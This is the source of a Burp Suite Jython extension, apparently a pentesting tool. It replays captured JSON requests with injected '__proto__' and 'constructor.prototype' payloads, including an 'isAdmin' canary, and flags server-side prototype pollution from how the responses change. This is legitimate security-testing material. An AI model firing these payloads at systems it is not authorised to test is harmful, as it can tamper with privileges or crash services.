# -*- coding: utf-8 -*-
# =============================================================================
#  Prototype Pollution Probe for Burp Suite Community
#  Single-file Jython extension that auto-detects JSON endpoints and tests
#  for server-side prototype pollution via __proto__ and constructor.prototype
#  injection at root and nested object levels.
#
#  Detection indicators:
#   - Canary reflection ("polluted":"yes" or isAdmin in response)
#   - Server crash (500 when baseline was 200/400)
#   - Status / length anomaly vs baseline
#   - Error keywords (prototype, __proto__, constructor, cannot read property)
#
#  Features:
#   - Background scan of proxy history
#   - Toggle "View Baseline" to A/B compare original vs polluted
#   - Send Baseline or Polluted to Repeater via right-click
#   - Export findings to CSV
#   - Context-menu entry in Proxy / Target / Repeater
# =============================================================================

from burp import (IBurpExtender, ITab, IContextMenuFactory, IMessageEditorController,
                  IHttpService)
from javax.swing import (JPanel, JTable, JScrollPane, JSplitPane, JButton, JLabel,
                         JTextField, JFileChooser, JOptionPane, JPopupMenu, JMenuItem,
                         SwingUtilities, ListSelectionModel, BorderFactory, JToolBar,
                         JToggleButton, RowFilter)
from javax.swing.table import DefaultTableModel
from javax.swing.event import ListSelectionListener
from java.awt import BorderLayout, Dimension
from java.awt.datatransfer import StringSelection
from java.awt import Toolkit
from java.awt.event import MouseAdapter, ActionListener
from java.io import File, FileOutputStream, OutputStreamWriter
from java.lang import Runnable, Thread, Integer, String
from java.util import ArrayList
import json
import copy
import threading


# -----------------------------------------------------------------------------
# Swing helper: invoke on EDT
# -----------------------------------------------------------------------------
class SwingRun(Runnable):
    def __init__(self, func):
        self.func = func
    def run(self):
        self.func()


# -----------------------------------------------------------------------------
# Table model with correct column classes for sorting
# -----------------------------------------------------------------------------
class FindingTableModel(DefaultTableModel):
    def __init__(self):
        DefaultTableModel.__init__(self,
            ["#", "URL", "Method", "Payload", "B-Status", "P-Status",
             "B-Len", "P-Len", "Indicator", "Confidence"], 0)

    def getColumnClass(self, col):
        if col in (0, 4, 5, 6, 7):
            return Integer
        return String


# -----------------------------------------------------------------------------
# Background scanner
# -----------------------------------------------------------------------------
class ScanRunner(Runnable):
    def __init__(self, extender):
        self.extender = extender

    def run(self):
        try:
            history = self.extender.callbacks.getProxyHistory()
            total = len(history)
            for i, msg in enumerate(history):
                self.extender.analyze_messages([msg])
                if i % 100 == 0:
                    SwingUtilities.invokeLater(SwingRun(
                        lambda i=i: self.extender.status.setText(
                            "Scanning %d / %d ..." % (i, total))))
            SwingUtilities.invokeLater(SwingRun(
                lambda: self.extender.status.setText(
                    "Scan complete - %d items processed" % total)))
        except Exception as e:
            SwingUtilities.invokeLater(SwingRun(
                lambda: self.extender.status.setText("Scan error: %s" % str(e))))
        finally:
            SwingUtilities.invokeLater(SwingRun(
                lambda: self.extender.scan_btn.setEnabled(True)))


# -----------------------------------------------------------------------------
# Row selection listener
# -----------------------------------------------------------------------------
class TableSelectionListener(ListSelectionListener):
    def __init__(self, extender):
        self.extender = extender
    def valueChanged(self, event):
        if event.getValueIsAdjusting():
            return
        row = self.extender.table.getSelectedRow()
        if row != -1:
            model_row = self.extender.table.convertRowIndexToModel(row)
            if 0 <= model_row < len(self.extender.findings):
                self.extender._show_finding(self.extender.findings[model_row])


# -----------------------------------------------------------------------------
# Right-click popup listener
# -----------------------------------------------------------------------------
class TablePopupListener(MouseAdapter):
    def __init__(self, extender):
        self.extender = extender
    def mousePressed(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def mouseReleased(self, e):
        if e.isPopupTrigger():
            self._show(e)
    def _show(self, e):
        popup = JPopupMenu()
        b = JMenuItem("Send Baseline to Repeater")
        b.addActionListener(SendBaselineListener(self.extender))
        popup.add(b)
        p = JMenuItem("Send Polluted to Repeater")
        p.addActionListener(SendPollutedListener(self.extender))
        popup.add(p)
        c = JMenuItem("Copy URL")
        c.addActionListener(CopyUrlListener(self.extender))
        popup.add(c)
        popup.show(e.getComponent(), e.getX(), e.getY())


class SendBaselineListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        self.extender._send_baseline_to_repeater()

class SendPollutedListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        self.extender._send_polluted_to_repeater()

class CopyUrlListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        self.extender._copy_url()


# -----------------------------------------------------------------------------
# Toggle listener
# -----------------------------------------------------------------------------
class ToggleListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        self.extender._on_toggle()


# -----------------------------------------------------------------------------
# Filter listener
# -----------------------------------------------------------------------------
class FilterListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        self.extender._apply_filter()


# -----------------------------------------------------------------------------
# Context menu listener
# -----------------------------------------------------------------------------
class ContextMenuListener(ActionListener):
    def __init__(self, extender, invocation):
        self.extender = extender
        self.invocation = invocation
    def actionPerformed(self, event):
        self.extender.analyze_messages(self.invocation.getSelectedMessages())


# -----------------------------------------------------------------------------
# Main extension
# -----------------------------------------------------------------------------
class BurpExtender(IBurpExtender, ITab, IContextMenuFactory, IMessageEditorController):

    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()
        self.callbacks.setExtensionName("PP Probe")

        self.findings = []
        self.findings_counter = 0
        self.current_finding = None
        self.viewing_baseline = False
        self._lock = threading.Lock()

        self._build_ui()

        self.callbacks.addSuiteTab(self)
        self.callbacks.registerContextMenuFactory(self)

        print("[PP Probe] Loaded.")

    def _build_ui(self):
        self.main_panel = JPanel(BorderLayout())
        self.main_panel.setBorder(BorderFactory.createEmptyBorder(4, 4, 4, 4))

        # ---- Toolbar ----
        toolbar = JToolBar()
        toolbar.setFloatable(False)

        self.scan_btn = JButton("Scan Proxy History", actionPerformed=self._on_scan)
        toolbar.add(self.scan_btn)
        toolbar.add(JButton("Export CSV", actionPerformed=self._on_export))
        toolbar.add(JButton("Clear", actionPerformed=self._on_clear))
        toolbar.addSeparator(Dimension(10, 0))

        self.toggle_btn = JToggleButton("View Baseline", actionPerformed=ToggleListener(self))
        toolbar.add(self.toggle_btn)
        toolbar.addSeparator(Dimension(10, 0))

        toolbar.add(JLabel("Filter:"))
        self.filter_field = JTextField(14)
        self.filter_field.addActionListener(FilterListener(self))
        toolbar.add(self.filter_field)

        self.main_panel.add(toolbar, BorderLayout.NORTH)

        # ---- Table ----
        self.model = FindingTableModel()
        self.table = JTable(self.model)
        self.table.setAutoCreateRowSorter(True)
        self.table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION)
        self.table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
        self.table.getSelectionModel().addListSelectionListener(TableSelectionListener(self))
        self.table.addMouseListener(TablePopupListener(self))

        cm = self.table.getColumnModel()
        cm.getColumn(0).setPreferredWidth(40)
        cm.getColumn(1).setPreferredWidth(520)
        cm.getColumn(2).setPreferredWidth(100)
        cm.getColumn(3).setPreferredWidth(100)
        cm.getColumn(4).setPreferredWidth(60)
        cm.getColumn(5).setPreferredWidth(60)
        cm.getColumn(6).setPreferredWidth(60)
        cm.getColumn(7).setPreferredWidth(60)
        cm.getColumn(8).setPreferredWidth(320)
        cm.getColumn(9).setPreferredWidth(90)

        scroll = JScrollPane(self.table)

        # ---- Request / Response editors ----
        self.req_editor = self.callbacks.createMessageEditor(self, False)
        self.resp_editor = self.callbacks.createMessageEditor(self, False)

        req_wrap = JPanel(BorderLayout())
        req_wrap.setBorder(BorderFactory.createTitledBorder("Request"))
        req_wrap.add(self.req_editor.getComponent(), BorderLayout.CENTER)

        resp_wrap = JPanel(BorderLayout())
        resp_wrap.setBorder(BorderFactory.createTitledBorder("Response"))
        resp_wrap.add(self.resp_editor.getComponent(), BorderLayout.CENTER)

        bottom_split = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, req_wrap, resp_wrap)
        bottom_split.setResizeWeight(0.5)
        bottom_split.setPreferredSize(Dimension(0, 360))

        center_split = JSplitPane(JSplitPane.VERTICAL_SPLIT, scroll, bottom_split)
        center_split.setResizeWeight(0.60)

        self.main_panel.add(center_split, BorderLayout.CENTER)

        self.status = JLabel("Ready")
        self.main_panel.add(self.status, BorderLayout.SOUTH)

    def getTabCaption(self):
        return "PP Probe"

    def getUiComponent(self):
        return self.main_panel

    # -------------------------------------------------------------------------
    # JSON detection
    # -------------------------------------------------------------------------
    def _is_json_request(self, msg):
        req_info = self.helpers.analyzeRequest(msg)
        headers = req_info.getHeaders()
        for h in headers:
            hl = h.lower()
            if hl.startswith("content-type:") and "json" in hl:
                return True
        body_offset = req_info.getBodyOffset()
        req_bytes = msg.getRequest()
        if req_bytes and len(req_bytes) > body_offset:
            first = chr(req_bytes[body_offset] & 0xFF)
            if first in '{[':
                return True
        return False

    # -------------------------------------------------------------------------
    # Payload generation
    # -------------------------------------------------------------------------
    def _generate_payloads(self, data):
        payloads = []
        canary = {"polluted": "yes", "isAdmin": True}

        if isinstance(data, dict):
            # Root __proto__
            p = copy.deepcopy(data)
            p["__proto__"] = copy.deepcopy(canary)
            payloads.append(("root-__proto__", p))

            # Root constructor.prototype
            p = copy.deepcopy(data)
            p["constructor"] = {"prototype": copy.deepcopy(canary)}
            payloads.append(("root-constructor", p))

            # Nested (max 5 first-level keys, depth 1 only)
            count = 0
            for k, v in data.items():
                if count >= 5:
                    break
                if isinstance(v, dict):
                    p = copy.deepcopy(data)
                    p[k] = copy.deepcopy(v)
                    p[k]["__proto__"] = copy.deepcopy(canary)
                    payloads.append(("nested-__proto__-%s" % k, p))

                    p = copy.deepcopy(data)
                    p[k] = copy.deepcopy(v)
                    p[k]["constructor"] = {"prototype": copy.deepcopy(canary)}
                    payloads.append(("nested-constructor-%s" % k, p))
                    count += 2
                elif isinstance(v, list):
                    for i, item in enumerate(v[:2]):
                        if isinstance(item, dict):
                            p = copy.deepcopy(data)
                            p[k] = copy.deepcopy(v)
                            p[k][i] = copy.deepcopy(item)
                            p[k][i]["__proto__"] = copy.deepcopy(canary)
                            payloads.append(("nested-__proto__-%s[%d]" % (k, i), p))

                            p = copy.deepcopy(data)
                            p[k] = copy.deepcopy(v)
                            p[k][i] = copy.deepcopy(item)
                            p[k][i]["constructor"] = {"prototype": copy.deepcopy(canary)}
                            payloads.append(("nested-constructor-%s[%d]" % (k, i), p))
                            count += 2
                            if count >= 5:
                                break

        elif isinstance(data, list):
            for i, item in enumerate(data[:3]):
                if isinstance(item, dict):
                    p = copy.deepcopy(data)
                    p[i] = copy.deepcopy(item)
                    p[i]["__proto__"] = copy.deepcopy(canary)
                    payloads.append(("array-__proto__[%d]" % i, p))

                    p = copy.deepcopy(data)
                    p[i] = copy.deepcopy(item)
                    p[i]["constructor"] = {"prototype": copy.deepcopy(canary)}
                    payloads.append(("array-constructor[%d]" % i, p))

        return payloads

    # -------------------------------------------------------------------------
    # Core analysis
    # -------------------------------------------------------------------------
    def analyze_messages(self, messages):
        for msg in messages:
            try:
                if msg.getResponse() is None:
                    continue
                if not self._is_json_request(msg):
                    continue

                req_info = self.helpers.analyzeRequest(msg)
                url = req_info.getUrl().toString()
                method = req_info.getMethod()
                service = msg.getHttpService()
                headers = req_info.getHeaders()

                body_offset = req_info.getBodyOffset()
                req_bytes = msg.getRequest()
                body_bytes = req_bytes[body_offset:]

                if len(body_bytes) > 100 * 1024:
                    continue

                body_str = self.helpers.bytesToString(body_bytes)
                try:
                    data = json.loads(body_str)
                except Exception:
                    continue

                payloads = self._generate_payloads(data)
                if not payloads:
                    continue

                baseline_req = self.helpers.buildHttpMessage(headers, body_bytes)
                baseline_resp = msg.getResponse()
                baseline_status = 0
                if baseline_resp:
                    baseline_status = self.helpers.analyzeResponse(baseline_resp).getStatusCode()

                for payload_type, payload_data in payloads:
                    try:
                        new_body_str = json.dumps(payload_data)
                        new_body = self.helpers.stringToBytes(new_body_str)
                        new_req = self.helpers.buildHttpMessage(headers, new_body)

                        # FIX: makeHttpRequest returns IHttpRequestResponse, not bytes
                        result_msg = self.callbacks.makeHttpRequest(service, new_req)
                        if result_msg is None or result_msg.getResponse() is None:
                            continue

                        polluted_resp_bytes = result_msg.getResponse()

                        result = self._analyze_response(baseline_resp, polluted_resp_bytes, payload_type)
                        if result:
                            self._add_finding(
                                url, method, payload_type, new_body_str[:120],
                                baseline_status, result['polluted_status'],
                                len(baseline_resp) if baseline_resp else 0,
                                len(polluted_resp_bytes),
                                result['indicators'], result['confidence'],
                                baseline_req, baseline_resp,
                                new_req, polluted_resp_bytes,
                                service
                            )

                        # FIX: Thread.sleep must be called on an instance
                        Thread.sleep(100)

                    except Exception as e:
                        print("[PP Probe] Payload error: %s" % str(e))

            except Exception as e:
                print("[PP Probe] analysis error: %s" % str(e))

    def _analyze_response(self, baseline_resp, polluted_resp, payload_type):
        indicators = []
        confidence = "Low"

        baseline_status = 0
        baseline_body = ""
        if baseline_resp:
            baseline_status = self.helpers.analyzeResponse(baseline_resp).getStatusCode()
            baseline_body = self.helpers.bytesToString(baseline_resp)

        polluted_status = self.helpers.analyzeResponse(polluted_resp).getStatusCode()
        polluted_body = self.helpers.bytesToString(polluted_resp)

        # 1. Canary / property reflection
        if '"polluted":"yes"' in polluted_body:
            indicators.append("Canary reflected")
            confidence = "High"
        if "isAdmin" in polluted_body:
            indicators.append("isAdmin reflected")
            confidence = "High"

        # 2. Crash detection
        if polluted_status >= 500 and baseline_status < 500:
            indicators.append("Server crash")
            confidence = "High"

        # 3. Status deviation
        if polluted_status != baseline_status and polluted_status < 500:
            indicators.append("Status %d->%d" % (baseline_status, polluted_status))
            if confidence == "Low":
                confidence = "Medium"

        # 4. Length anomaly
        bl = len(baseline_resp) if baseline_resp else 0
        pl = len(polluted_resp)
        if bl > 0:
            diff = abs(pl - bl)
            if diff > 500 or (float(diff) / bl > 0.3):
                indicators.append("Length anomaly")
                if confidence == "Low":
                    confidence = "Medium"

        # 5. Error keywords (only if new vs baseline)
        keywords = ["prototype", "__proto__", "constructor", "polluted", "isAdmin",
                    "cannot read property", "undefined is not"]
        for kw in keywords:
            if kw in polluted_body.lower() and kw not in baseline_body.lower():
                indicators.append("Keyword: %s" % kw)
                confidence = "High"
                break

        if indicators:
            return {
                'indicators': "; ".join(indicators),
                'confidence': confidence,
                'polluted_status': polluted_status
            }
        return None

    def _add_finding(self, url, method, payload_type, payload_snippet,
                     baseline_status, polluted_status, baseline_len, polluted_len,
                     indicator, confidence,
                     baseline_req, baseline_resp, polluted_req, polluted_resp,
                     service):
        with self._lock:
            self.findings_counter += 1
            fid = self.findings_counter
            finding = {
                'id': fid,
                'url': url,
                'method': method,
                'payload_type': payload_type,
                'payload_snippet': payload_snippet,
                'baseline_status': baseline_status,
                'polluted_status': polluted_status,
                'baseline_len': baseline_len,
                'polluted_len': polluted_len,
                'indicator': indicator,
                'confidence': confidence,
                'baseline_request': baseline_req,
                'baseline_response': baseline_resp,
                'polluted_request': polluted_req,
                'polluted_response': polluted_resp,
                'service': service
            }
            self.findings.append(finding)

        def update():
            self.model.addRow([
                fid, url, method, payload_snippet,
                baseline_status, polluted_status,
                baseline_len, polluted_len,
                indicator, confidence
            ])
            self.status.setText("Findings: %d" % len(self.findings))

        SwingUtilities.invokeLater(SwingRun(update))

    # -------------------------------------------------------------------------
    # UI interactions
    # -------------------------------------------------------------------------
    def _show_finding(self, finding):
        self.current_finding = finding
        self._refresh_editors()
        mode = "BASELINE" if self.viewing_baseline else "POLLUTED"
        self.status.setText("%s | %s | %s" % (mode, finding['confidence'], finding['indicator']))

    def _refresh_editors(self):
        if not self.current_finding:
            return
        if self.viewing_baseline:
            req = self.current_finding['baseline_request']
            resp = self.current_finding['baseline_response']
        else:
            req = self.current_finding['polluted_request']
            resp = self.current_finding['polluted_response']

        empty = self.helpers.stringToBytes("")
        self.req_editor.setMessage(req if req else empty, True)
        self.resp_editor.setMessage(resp if resp else empty, False)

    def _on_toggle(self, event=None):
        self.viewing_baseline = self.toggle_btn.isSelected()
        self._refresh_editors()
        if self.current_finding:
            mode = "BASELINE" if self.viewing_baseline else "POLLUTED"
            self.status.setText("%s | %s | %s" % (mode, self.current_finding['confidence'], self.current_finding['indicator']))

    def _send_baseline_to_repeater(self):
        if self.current_finding:
            f = self.current_finding
            self.callbacks.sendToRepeater(
                f['service'].getHost(), f['service'].getPort(),
                f['service'].getProtocol() == "https",
                f['baseline_request'], None
            )
            self.status.setText("Sent BASELINE to Repeater")

    def _send_polluted_to_repeater(self):
        if self.current_finding:
            f = self.current_finding
            self.callbacks.sendToRepeater(
                f['service'].getHost(), f['service'].getPort(),
                f['service'].getProtocol() == "https",
                f['polluted_request'], None
            )
            self.status.setText("Sent POLLUTED to Repeater")

    def _copy_url(self):
        if self.current_finding:
            url = self.current_finding['url']
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(StringSelection(url), None)
            self.status.setText("URL copied to clipboard")

    def _apply_filter(self):
        text = self.filter_field.getText().strip()
        sorter = self.table.getRowSorter()
        if sorter is None:
            return
        try:
            if text:
                sorter.setRowFilter(RowFilter.regexFilter("(?i)" + text))
            else:
                sorter.setRowFilter(None)
        except Exception:
            sorter.setRowFilter(None)

    def _on_scan(self, event):
        self.scan_btn.setEnabled(False)
        self.status.setText("Scanning proxy history ...")
        Thread(ScanRunner(self)).start()

    def _on_export(self, event):
        chooser = JFileChooser()
        chooser.setSelectedFile(File("pp_probe_findings.csv"))
        ret = chooser.showSaveDialog(self.main_panel)
        if ret == JFileChooser.APPROVE_OPTION:
            try:
                f = chooser.getSelectedFile()
                fos = FileOutputStream(f)
                w = OutputStreamWriter(fos, "UTF-8")
                w.write("ID,URL,Method,PayloadType,PayloadSnippet,BaselineStatus,PollutedStatus,BaselineLength,PollutedLength,Indicator,Confidence\n")
                for finding in self.findings:
                    w.write('%d,%s,%s,%s,%s,%d,%d,%d,%d,%s,%s\n' % (
                        finding['id'],
                        self._csv_escape(finding['url']),
                        self._csv_escape(finding['method']),
                        self._csv_escape(finding['payload_type']),
                        self._csv_escape(finding['payload_snippet']),
                        finding['baseline_status'],
                        finding['polluted_status'],
                        finding['baseline_len'],
                        finding['polluted_len'],
                        self._csv_escape(finding['indicator']),
                        self._csv_escape(finding['confidence'])
                    ))
                w.close()
                JOptionPane.showMessageDialog(self.main_panel,
                    "Exported successfully to:\n%s" % f.getAbsolutePath())
            except Exception as e:
                JOptionPane.showMessageDialog(self.main_panel,
                    "Export failed: %s" % str(e),
                    "Error", JOptionPane.ERROR_MESSAGE)

    def _csv_escape(self, s):
        if '"' in s or ',' in s or '\n' in s or '\r' in s:
            return '"' + s.replace('"', '""') + '"'
        return s

    def _on_clear(self, event):
        with self._lock:
            self.findings = []
            self.findings_counter = 0
        while self.model.getRowCount() > 0:
            self.model.removeRow(0)
        self.current_finding = None
        empty = self.helpers.stringToBytes("")
        self.req_editor.setMessage(empty, True)
        self.resp_editor.setMessage(empty, False)
        self.status.setText("Cleared")

    # -------------------------------------------------------------------------
    # Burp context menu
    # -------------------------------------------------------------------------
    def createMenuItems(self, invocation):
        menus = ArrayList()
        item = JMenuItem("Send to PP Probe")
        item.addActionListener(ContextMenuListener(self, invocation))
        menus.add(item)
        return menus

    # -------------------------------------------------------------------------
    # IMessageEditorController
    # -------------------------------------------------------------------------
    def getHttpService(self):
        if self.current_finding:
            return self.current_finding['service']
        return None

    def getRequest(self):
        if self.current_finding:
            if self.viewing_baseline:
                return self.current_finding['baseline_request']
            return self.current_finding['polluted_request']
        return None

    def getResponse(self):
        if self.current_finding:
            if self.viewing_baseline:
                return self.current_finding['baseline_response']
            return self.current_finding['polluted_response']
        return None
